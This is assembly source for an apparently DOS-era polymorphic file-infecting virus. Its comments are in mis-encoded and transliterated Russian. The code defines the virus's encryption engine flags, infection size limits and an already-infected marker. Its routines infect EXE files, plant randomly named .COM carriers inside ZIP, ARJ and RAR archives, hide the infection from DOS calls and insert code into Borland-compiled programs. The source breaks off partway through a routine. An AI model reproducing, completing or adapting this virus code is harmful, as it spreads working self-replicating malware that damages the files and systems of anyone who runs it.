                MASK EN_RELOCATOR   or  \
                MASK EN_SAVE_REGS
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;ä« £¨ ¤«ï ¢¨àãá  ¢ EXEä ©«¥ c podgruzkoi
ENFLAGS_IXE =   MASK EN_USE_JMPS    or  \
                MASK EN_USE_CALL    or  \
                MASK EN_RELOCATOR   or  \
                MASK EN_SAVE_REGS   or  \
                (2 shl  EN_BFR_GARBL)   ;
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;ä« £¨ ¤«ï ¢¨àãá  ¢ OBJä ©«¥
ENFLAGS_OBJ =   MASK EN_INT_GARBL   or  \
                MASK EN_SAVE_REGS   or  \
                MASK EN_USE_CALL    or  \
                MASK EN_RELOCATOR   or  \
                (1 shl  EN_BFR_GARBL)   ;
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;ä« £¨ ¤«ï ¢¨àãá  ¢ OBJä ©«¥
;ENFLAGS_OBJ =   MASK EN_INT_GARBL   or  \
;                MASK EN_SAVE_REGS   or  \
;                MASK EN_RELOCATOR
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;®¯ª®¤ë
opNOP           equ 90h
opPUSHF         equ 9Ch
opINT           equ 0CDh
opCALL          equ 0E8h
opJMPN          equ 0E9h
opJMPS          equ 0EBh
opSEGCS         equ 2Eh
opSEGES         equ 26h
opRETN          equ 0C3h
opRETF          equ 0CBh
opJMPFAR        equ 0EAh
opMOV_AHimm     equ 0B4h
opPUSH_CS       equ 0Eh
opPUSHA         equ 60h
opPOPA          equ 61h
opJC            equ 72h
opJZ            equ 74h
opPOP_AX        equ 58h
opPUSH_AX       equ 50h
opCMP_AXimm     equ 3Dh
opCMP_ALimm     equ 3Ch
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;¬¨­¨¬ «ì­ë© ¨ ¬ ªá¨¬ «ì­ë© à §¬¥àë § à ¦ ¥¬ëå EXEè­¨ª®¢
MININFECTSIZE   equ 400h   ;  1k
MAXINFECTSIZE   equ 80000h ;512k
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
INTERVAL_INFECT = 2
INCUB_TIME      = 3 ;14 sec

VIRUSSTACKSIZE  equ 0D0h
TIMEMARKER      equ 1
SIZEMARKER      equ 157d
SIZEMARKER_MOD  equ 37d
CRYPTLEVEL      equ 50h   ;¬ ªá¨¬ «ì­® ¢®§¬®¦­ë© (!)
DOUBLEENCRYPT   equ 80h
HDRCRYPTLEVEL   equ 4Fh
EXECRYPTLEVEL   equ 23h ;+DOUBLEENCRYPT
IXECRYPTLEVEL   equ 29h
ARXCRYPTLEVEL   equ 27h+DOUBLEENCRYPT
OBJCRYPTLEVEL   equ 1Fh
IRP EXT, <ARX,EXE,IXE,OBJ,HDR>
    zmefl&EXT        equ (&EXT&CRYPTLEVEL shl 8) or ENFLAGS_&EXT
ENDM
UNINIT          equ 1111h
ZIP_SIGN = 4B50h
ARJ_SIGN = 60000d
RAR_SIGN = 6152h
HA_METHOD_STORED = 20H
ARJ_METHOD_STORED = 0
ZIP_METHOD_STORED = 0
RAR_METHOD_STORED = 30h
ZIP_LCL_ID = 403h
ZIP_CNL_ID = 201h
ZIP_END_ID = 605h
CRLF equ <0Dh,0Ah>
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;dword_shit struc
;       lo   dw ?
;       hi   dw ?
;ends
dword_shit struc
    union
        lo      dw  ?
        struc
            l       db  ?
            h       db  ?
        ends
    ends
    hi      dw  ?
ends

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
ifInfJump macro whatest, execut
extrn IfInfect&whatest:near
;    lea     di, execut
    call    IfInfect&whatest
endm
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
probability_test macro variabl, glb_pr, go_to
local __1
extrn variabl:byte
    call    RND_GET_BYTE
    cmp     ah, byte ptr ds:[variabl]
    jae __1
    cmp     al, glb_pr
__1:
    jae go_to
endm
prALWAYS =  -1

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
ENGBUFFER   STRUC                           ;
            UNION
                STRUC                           ;
                    zmeflags        ENFLAGS ?
                    cur_cryptlevel  db      ?
                ENDS
                zmefl               dw      ?
            ENDS
            datasize                dw      ?
            jmp_after_decrypt       dw      ?
            targetptr               dw      ?
            segm_IDT                db      ?
            cJMP_patch              dw      ?
            nJMP_patch              dw      ?
            begin_sub               dw      ?
            end_of_jmp              dw      ?
            start_reg2              dw      ?
            start_reg3              dw      ?
            loop_top                dw      ?
            lastgarble              db      ?
            lastchoose              db      ?
            decryptor_size          dw      ?
            relocator_base          dw      ?
            reloff_1                dw      ?
            reloff_2                dw      ?
            value_J                 dw      ?
            value_X                 dw      ?
            value_Y                 dw      ?
            useregs                 asgrbl  ?
            IRPC NR, 0123456
                reg&NR              RegWord ?
            ENDM
ENDS
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

;all_memory_size_p=400h ;16k in memory :)
all_memory_size_p=700h ;20k in memory :(
HDRBUFSIZE = 22h
hp equ (bp-80h)


WORKBUFFER  STRUC
        UNION
            STRUC ;infect ARX
                _arx_crc            dd  ?
                _fnamestr           db  12d dup (?)
                _hafcount           dw  ?
            ENDS
            STRUC ;infect OMF
                _siz98              dw  ?
                _posA0              dd  ?
                _sizA0              dw  ?
                _lib_dict_offset    dw  ?
            ENDS
            STRUC
                UNION
                    STRUC ;func 4B
                        _load_fname dw  ?
                        _load_array dw  ?
                    ENDS
                    STRUC ;func 3F
                        _rd_st_cnt  dw  ?
                        _st_rd_off  dw  ?
                        _beg_pos_lo dw  ?
                    ENDS
                ENDS
                UNION
                    _saved_seek     dd  ?  ;for restore header etc
                    STRUC ;stealth int25
                        _start_sec      dd  ?
                        _abs_read_drive db  ?
                    ENDS
                ENDS
            ENDS
         ENDS
        _host_arx_date              dw  ?    ; ¤äâ  § à ¦ ¥¬®£® ä ©« 
        _host_arx_time              dw  ?    ; ¤äâ  § à ¦ ¥¬®£® ä ©« 
        _beg_pos                    dd  ?   ;use in "f_insert"
        _pos98                      dd  ?
        _fisize                     dw  ?
        _fioff                      dw  ?
        _fnamesize                  dw  ?
        _crthdr                     db  40h dup (?)
        _last_infect_time           dw  ?
        _hook                       dw  ?
        _close_on_error             db  ?   ;if 1, doserror-> close file
        _save_sp                    dw  ?
        _save_ss                    dw  ?
        _after_goto                 dw  ?
        _five_bytes                 db  5 dup (?)
        _turn_name_crc              dw  ?
        _engdata                    ENGBUFFER   ?
        _exehdr                     db  HDRBUFSIZE dup (?)
;        _dataencriptor              dd      CRYPTLEVEL dup (?)
;        _for_ret                    db      ?

ENDS
_hahdr         equ _exehdr
_ziphdr        equ _exehdr
_arjhdr        equ _exehdr
_rarhdr        equ _exehdr
_objhdr        equ _exehdr
_libhdr        equ _exehdr
_sfxhdr        equ _exehdr
_shift_buffer  equ _exehdr


To_hp MACRO some_label
    some_label equ   (hp+_&some_label&)
ENDM

To_hp   host_arx_date
To_hp   host_arx_time
To_hp   hook
To_hp   last_infect_time
To_hp   close_on_error
To_hp   after_goto
To_hp   lib_dict_offset
To_hp   hafcount
To_hp   saved_seek
To_hp   start_sec
To_hp   abs_read_drive
To_hp   beg_pos
To_hp   arx_crc
To_hp   load_fname
To_hp   load_array
To_hp   rd_st_cnt
To_hp   st_rd_off
To_hp   beg_pos_lo
To_hp   fnamestr
To_hp   pos98
To_hp   siz98
To_hp   posA0
To_hp   sizA0
To_hp   fisize
To_hp   fioff
To_hp   fnamesize
To_hp   engdata
To_hp   crthdr
To_hp   exehdr
To_hp   save_sp
To_hp   save_ss
To_hp   five_bytes
To_hp   turn_name_crc
To_hp   hahdr
To_hp   ziphdr
To_hp   arjhdr
To_hp   rarhdr
To_hp   objhdr
To_hp   libhdr
To_hp   sfxhdr
To_hp   shift_buffer

PURGE To_hp

include zurich.asi
code segment byte public
assume cs:code, ds:code, es:code, ss:code
IFDEF USE_BEEP
public  beep

beep proc
call beep1
beep endp

beep1 proc
      push      cx ax
      mov       al, 3
      out       61h, al
REPT 2
      loop      $
ENDM
      mov       al, 0
      out       61h, al
      pop      ax cx
      ret
beep1 endp
ENDIF
ends
end

;include shmac.inc
include star14t.inc
code segment public byte
assume cs:code
public Calculate_CRC
public Calculate_CRC5
;-+----------------------------------------------------------+-
;ds:si=ptr
;di=size
;return:    cx:dx=crc32
;-+----------------------------------------------------------+-
Calculate_CRC5:
    mov     di, 5
Calculate_CRC:
    cld
    push    bx
    mov     cx, -1
    mov     dx, cx
    DO
        xor     ax, ax
        xor     bx, bx
        lodsb
        xor     al, cl
        mov     cl, ch
        mov     ch, dl
        mov     dl, dh
        mov     dh, 8
        DO
            shr     bx, 1
            rcr     ax, 1
            DOIF C
                xor     ax, 08320H
                xor     bx, 0EDB8H
            DONE
        dec     dh
        CYCLE NZ
        xor     cx, ax
        xor     dx, bx
    dec     di
    CYCLE NZ
    not     dx
    not     cx
    pop     bx
    mov     ax, dx
    ror     ax, cl
    add     ax, cx
    ret
;-+----------------------------------------------------------+-
ends
end

INCLUDE ZURICH.ASI
code segment byte public
assume cs:code, ds:code, es:code, ss:code


;.DATA
public vir_heap, StealthName, start_data
public dataencriptor
public heap
public InfectTurn
public zip_h
public arj_h


;public five_bytes

zip_h    dw      ZIP_SIGN, ZIP_LCL_ID, 14h
arj_h    dw      ARJ_SIGN, 31Eh
start_data:
vir_heap:

       WORKBUFFER ?

dataencriptor   dd      CRYPTLEVEL dup (?)
for_ret         db      ?

StealthName       db 80h dup (?)
InfectTurn    db 80h dup (?)
pblabel continue21
         db     11d dup (?)
         db     ?
ret_hook dd     ?
ret_sux  dw     ?
public ret_hook
public ret_sux
;    public  after_goto
;after_goto    dw ?


heap:
       db 1800h dup (?)
end_data:
;nameforinfect   db 80h dup (?)
;CurDta
mem_virus_end:
;data_size=end_data-begin_data
;all_memory_size_p equ (offset mem_virus_end+30h)/10h
ends
end

code segment byte public
assume cs:code, ds:code, es:code, ss:code
public get_sft
get_sft proc ;bx-handle ;es:di-ptr to sft
    push     ax bx
    mov      ax, 1220h
    int      2Fh
    mov      bl, es:[di]
    mov      ax, 1216h
    int      2Fh
    pop      bx ax
    ret
get_sft endp
ends
end

code segment byte public
assume cs:code, ds:code, es:code, ss:code

public get_cur_time
get_cur_time proc
    push    ds
    xor     ax, ax
    mov     ds, ax
    mov     ax, word ptr ds:[46Dh]
    pop     ds
    ret
get_cur_time endp

ends
end

INCLUDE ZURICH.ASI
code segment byte public
assume cs:code, ds:code, es:code, ss:code
STACKBASE       equ 080h
extrn restore_seek      :near
extrn save_seek         :near
extrn seek_end          :near
extrn dosseek_bof       :near
extrn DOSCALL            :near
extrn DosCall_exc        :near
extrn NOSTL21NAMES       :near
extrn           get_own_name        :near
extrn           get_crc_just_fname  :near
;extrn check_PROCESS_NAME :near
;extrn EXE_TEST_READ    :near
extrn start_data       :near
extrn dosclose         :near
extrn read_buf_22      :near

;public exe_test_read
;public IfInfectName
;public IfInfectHandle
;public IfInfectBuf
;public IfInfectNameCustom
;public exe_test
;public test_size

;-+------------------------------------------------------------------------+-
pblabel IfInfectName    ;ds:dx - filename ax - 3Dxx for open file
    mov     ax, 3D40h     ; open R/O file
pblabel IfInfectNameCustom
    mov     byte ptr cs:[ErrorRead], opCALL
    call    DosCall_exc       ; open file
         ;  ¥á«¨ ­¥ ®âªà®¥âáï - ®ç¥­ì ¯«®å® :(
         ;­ ¤® ®¡ï§ â¥«ì­® ®âªàëâì (67h?)
;            push bx
    xchg    bx, ax
         call   seek_end
         call   test_size

;         jnz    ErrorRead


    jz      IfInfectHandle1
ErrorRead:
         call  dosclose  ; close file
         pop ax
         ret
;-+------------------------------------------------------------------------+-


pblabel IfInfectHandle
         mov    byte ptr cs:[ErrorRead], 0B8h ;don't close this file
IfInfectHandle1:
         MOVSEG ds, cs
         ;*****************test size


         mov       ax, 4400h        ; IOCTL test for file/stream
         call      DosCall     ;NDD: open 'CON' :)
         jc        ErrorRead        ;no file
         rol       dl, 1
         jc        ErrorRead        ;no file

         call   save_seek
;
;         call   seek_end
;         call   test_size
;         jnz    ErrorRead
;
         call   dosseek_bof
         call   read_buf_22
;         jc     ErrorRead
         call   restore_seek


pblabel IfInfectBuf
;if PKZIP, NDD (ZF=1) - no stealth
          push    ds dx
          call    get_own_name
          call    get_crc_just_fname
          pop     dx ds
          jz     ErrorRead
         call      exe_test
         jnz       ErrorRead         ;test for infect

         mov      ax, [exehdr.exe_CS]     ;later to ss:[ExeCS]
         add      ax, [exehdr.exe_par_dir]
         mov      cx, 10h
         mul      cx
         add      ax, [exehdr.exe_SP]
         sub      ax, STACKBASE-10h ;offset virus_start-10h ;ax - original size
         cmp        ah, MININFECTSIZE/100h
         jb         ErrorRead
         test      al, 1
         jnz        ErrorRead
         ret
;IfInfectHandle endp
;-+------------------------------------------------------------------------+-

;-+------------------------------------------------------------------------+-
pblabel exe_test  ;-+------- test for already infect -> ZF=1 if infect
                                                   ;ZF=0 - no infected file
;     mov       ax, [exehdr.exe_SS]
;     inc       ax
;     sub       ax, [exehdr.exe_CS]
;     DOIF Z

     mov       al, [exehdr.exe_SS.h]
     sub       al, [exehdr.exe_CS.h]
     cmp       al, 17h
     DOIF BE
        mov     ax, [exehdr.exe_SP]
        and     ax, 0FFF0h
        sub     ax, STACKBASE
     DONE
     ret
;-+------------------------------------------------------------------------+-

;-+------------------------------------------------------------------------+-
pblabel test_size  ;ax-(file_size and 0FFFFh)
              ;-+------- test for already infect -> ZF=1 if possible infect
                                                   ;ZF=0 - no infected file
;for length with virus
         push   ax cx dx
         xor    dx, dx
         mov    cx, SIZEMARKER
         div    cx
         cmp    dx, SIZEMARKER_MOD
         pop    dx cx ax
         ret
;-+------------------------------------------------------------------------+-

ends
end

; BUG LIST
; 1. no infect ARJSFX
; 2. no -AV in ZIP
; 3. no support RAR 1.30
; 4. no support long names

INCLUDE ZURICH.ASI

code segment byte public
assume cs:code, ds:code, es:code, ss:code
STACKBASE       equ 080h

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
extrn   DOSCALL             :near
extrn   DOStruncate         :near
extrn   rt_err              :near
extrn   vir_heap            :near
extrn   EXE_TEST            :near
extrn   SEEK_END            :near
extrn   TEST_SIZE           :near
extrn   START_DATA          :near
extrn   CALC_HDR_PAGES      :near
extrn   DOSSEEK             :near
extrn   START_DATA          :near
extrn   DOSSEEK_BOF         :near
extrn   ZME_crypt           :near
extrn   dosseek_cur         :near
extrn   DosCall_exc         :near
extrn   SHIT_AX             :near
extrn   get_sft             :near
extrn   dostell             :near
extrn   heap                :near
extrn   DosSeek_all         :near
extrn   dosseek_cur_neg_dx  :near
extrn   dosseek_cur_neg_ax  :near
extrn   dosseek_cur_cx_1    :near
extrn   dosseek_cur_cx_0    :near
extrn   dosseek_cx_0        :near
extrn   arj_h               :near
extrn   zip_h               :near
extrn   dosread             :near
extrn   read_buf_22         :near
extrn   read_buf_cx         :near
extrn   DosWrite_shbuf_22   :near
extrn   DosWrite_shbuf      :near
extrn   DosWrite            :near
extrn   dosclose            :near
extrn   doswrite_from_heap  :near
extrn   _____               :byte
extrn   Calculate_CRC       :near
extrn   get_cur_time        :near
extrn   get_crc_just_fname  :near
extrn   InfectTurn          :byte
extrn   crypt_exe_header    :near
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel InfectName
    MOVSEG  ds, cs
    lea     dx, InfectTurn
    call    get_crc_just_fname
    jz      $ret$
    cmp     ax, [turn_name_crc]
    je      $ret$
    mov     [turn_name_crc], ax
    mov     ax, 3D12h
    call    DosCall_exc
    xchg    bx, ax
    push    bx
    call    InfectHandle
    pop     bx
    jmp     dosclose
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel InfectHandle ;ret
;    cld
    MOVSEG  ds, cs
    MOVSEG  es, cs
    call    no_freq_proc
    mov     ax, 5700h
    call    doscall
    mov     [host_arx_date], dx ;  dx = date
    mov     [host_arx_time], cx ;  cx = time
    mov     ah, 2Ah  ; ¯®«ãç¨âì â¥ªãéãî ¤ âã ¨ ......
    call    doscall
    xor     dx, [host_arx_date]    ;­¥ § à ¦ âì ä ©«ë íâ®© ­¥¤¥«¨
    and     dx, 18h ;week only         ; ¨áª«. á®§¤ ¢ ¥¬ë¥ ä ©«ë (?)
    DOIF NZ
        call    arxtest
    DONE
    mov     cx, [host_arx_time]
    xor     cl, 1   ;change time for 1F
    mov     dx, [host_arx_date]
    mov     ax, 5701h
    jmp     doscall_exc
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel arxtest ;close file(?)
    call    RND_INIT
    mov     ax, 4400h        ; IOCTL test for file/stream
    call    DosCall_exc
    cmp     dl, 80h
    DOIF NC
$ret:   pop ax ;don't restore file time
$ret$:  retn
    DONE
    and     dl, 0Fh
    inc     dx  ;1=a, 3=C

;IFDEF RELIZ
;   cmp     dl, 3
;ELSE
;   cmp     dl, 4
;    jbe      $ret ; no flop & C:
;ENDIF
;    jc      $ret ; no flop
;int 2bh

cmp     dl, 3 ;<<debug
jbe  $ret      ;<<debug
$BEEP$
;cmp     dl, 2 ;<<debug
;je  $ret      ;<<debug
;cmp     dl, 1 ;<<debug
;je  $ret      ;<<debug

        call    get_sft
        cmp     es:[di.sf_name.9], 'V' ;*.ov?
        je      $ret
        inc     di
        DOIF NZ
            inc    di
            sto_word  2012h
            sto_byte  20h
        DONE

        movseg  es, ss

    push    bx ds
    mov     ah, 32h           ;get DPB
    call    DosCall                ;test for RAM-DISK
    cmp     byte ptr ds:dpb_FAT_count[bx], 1  ;RAM-DISK have one FAT
    DOIF NE
        mov     ah, 36h           ;get Disk space
        call    DosCall          ;BX - free clusters
        and      bh, bh           ;BX < 100h
    DONE
;no_free_space2:                  ;8k*100h  = 2Mb
    pop     ds bx            ;.5k*100h = 128k
    jz      $ret

;int 2bh
;    mov     es:[(di-1).sf_mode.l], 12h   ;mode +2
;    mov     es:[(di-1).sf_attr], 20h     ;attr +4

    call    dosseek_bof
pblabel second_tst
    call    read_buf_22
    cmp     al, HDRBUFSIZE
    jne     __ret
    mov     crcpass, 8
    DO
        shr     crcpass, 1
        DOIF E ;CPU conveir
__ret:
            ret
        DONE
        lea     si, [vir_heap._exehdr]
        mov     di, 2 ;4,2,1
crcpass equ byte ptr ($-2)
        call    calculate_crc
        lea     di, hdrs
        mov     cx, (offs-hdrs)/2
        repne   scasw
    CYCLE NZ

    push    word ptr [di+offs-hdrs-2]
    cmp     cx, (offs-endarxex)/2 ;<<<
    DOIF AE  ;zip, arj, rar
;Ä[create & infect file]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
        call    RND_GET_BYTE
        lea     di, [heap]
        sto_byte opJMPN
        stosw
        mov     ax, zmeflARX
        call    ZME_crypt ;;ret CX-SIZE
        lea     si, [heap]
        mov     word ptr [fioff] , si
        mov     [si+1], ax  ;<com
        call    RND_GET
        and     ax, 0FFFh ;<<<<<<<<<<,
;        push    ax
        add     ax, 3    ;<com
        add     cx, ax

        mov     word ptr [fisize], cx ;<all
;        pop     ax
        call    SHIT_AX
;create & infect carrier
        mov     di, [fisize]
        call    Calculate_CRC
        mov     [arx_crc.lo], cx
        mov     [arx_crc.hi], dx
;Ä[generate name]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;int 2bh
;$BEEP$
        call    RND_GET_Three_Bits
        and     al, not 4
        add     al, 2
        mov     cx, ax
        add     al, 4
        mov     word ptr [fnamesize], ax
        lea     di, [vir_heap._fnamestr]
        DO
            DO
                call    RND_GET_BYTE
                cmp     al, 'V'-'A'   ; ('Z'-'A')
            CYCLE A
            add     al, 'A'
            stosb
        CYCLE LU
        sto_two_byte '.', 'C'
        sto_two_byte 'O', 'M'
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
    DONE
    MOV    [pos98.hi], -1
$$ret:
    retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

;ÄÅÄÄ[process EXE/SFX]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄ
pblabel process_exe
    mov     ax, [exehdr.exe_pages]
    mov     cx, [exehdr.exe_len_mod_512]
    jcxz    ExactPage
    dec     ax
pblabel ExactPage
    mov     dx, 200h
    mul     dx
    add     cx, ax
    xchg    cx, dx
    call    DosSeek
    call    second_tst
    cmp     di, offset offs-2
    jb      $$ret
;ÄÅÄÄ[process EXE]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄ
            ;newexetest
;            probability_test prblt_infct_EXE, 0f0h, error_exit
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; INFECT exe
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;int 2bh
    call        seek_end
;§¤¥áì ®âá¥ïâì ¬ «¥­ìª¨¥ ä ©«ë
    cmp         ah, MININFECTSIZE/100H
    jb          $$ret
;................................
    call      test_size ;proc;ax-(file_size and 0FFFFh)
    jz        $$ret

    call      dosseek_bof
    call      read_buf_22
    call      exe_test
    jz        $$ret             ;already infect
;; ­¥ § à ¦ âì EXE ä ©«ë ¡¥§ à¥«®ª¥©è¥­®¢,
;¨ ¥á«¨ à¥«®ª¥©è¥­®¢ ®ç¥­ì ¬­®£® (?)
    cmp     byte ptr [exehdr.exe_rle_count], 1 ;0 or 1 relocations
    jb     $$ret
;................................

;; ¥á«¨ ¤«¨­  § £àã¦ ¥¬®© ç áâ¨ exeè­¨ª  ¡®«ìè¥ ... 32k = 40h pages
;test for pklite(etc) & PASS E
    cmp     word ptr [exehdr+18h], 40h ;
    jae     standart_exe_infect2
    mov     al, byte ptr [exehdr+1Eh]
    cmp     al, 'P' ;PKLITE ?
    je      standart_exe_infect2
    cmp     al, 20h ;07, 20h -WATCOM
    je      standart_exe_infect2
    cmp     al, 7   ;07, 20h -WATCOM
    je      standart_exe_infect2
    cmp     byte ptr [exehdr.exe_pages], 40h
    jbe     standart_exe_infect2
pblabel insert_exe_infect
        mov     dx, [exehdr.exe_par_dir]
        shl     dx, 4
        jc      standart_exe_infect2 ;if header>64k
        call    dosseek_cx_0
        lea     dx, [heap]
        mov     cx, 1800h ;6k
        call    DosRead
        xchg    cx, ax
        ;scan
        lea     si, [heap+2]
        DO
            mov     di, 3
            dec     si
            dec     si
            push    cx
            call    calculate_crc    ;<add si,3
            cmp_ax_CRC32w  <55h, 8Bh, 0ECh> ;push bp; mov bp,sp ;< BORLAND
            je      exfnd
            cmp_ax_CRC32w  <55h, 89h, 0E5h> ;push bp; mov bp,sp ;< BORLAND
            je      exfnd
pblabel cont_search
            pop     cx          ;
        CYCLE LU
pblabel standart_exe_infect2
        jmp standart_exe_infect
pblabel exfnd
sizeof_part1=54h
        push    si
        mov     cx, sizeof_part1
        DO
            lodsb
            push    cx
            lea     di, endd
            mov     cx, 6
            repne scasb
            pop     cx
;            jz      nff
            ;nff:
            DOIF Z
                pop     si
                jmp     cont_search
            DONE
        CYCLE LU
        pop     si
;$BEEP$
extrn ffsize_lo:word
extrn ffsize_hi:word
        call    seek_end
        mov     ffsize_lo, ax
        mov     ffsize_hi, dx
        mov     dx, [exehdr.exe_par_dir]
        shl     dx, 4
        add     dx, si
        sub     dx, (offset heap)+3
        call    dosseek_cx_0
        lea     dx, [heap+sizeof_part2]
; to heap+sizeof(part2)
        mov     cx, sizeof_part1
        call    DosRead
        call    dosseek_cur_neg_ax
            ;§¤¥áì part 1
extrn part1:near
extrn part2:near
;¢ë¡®à ªà¨¯â®¢é¨ª  ¤«ï part2 (?)
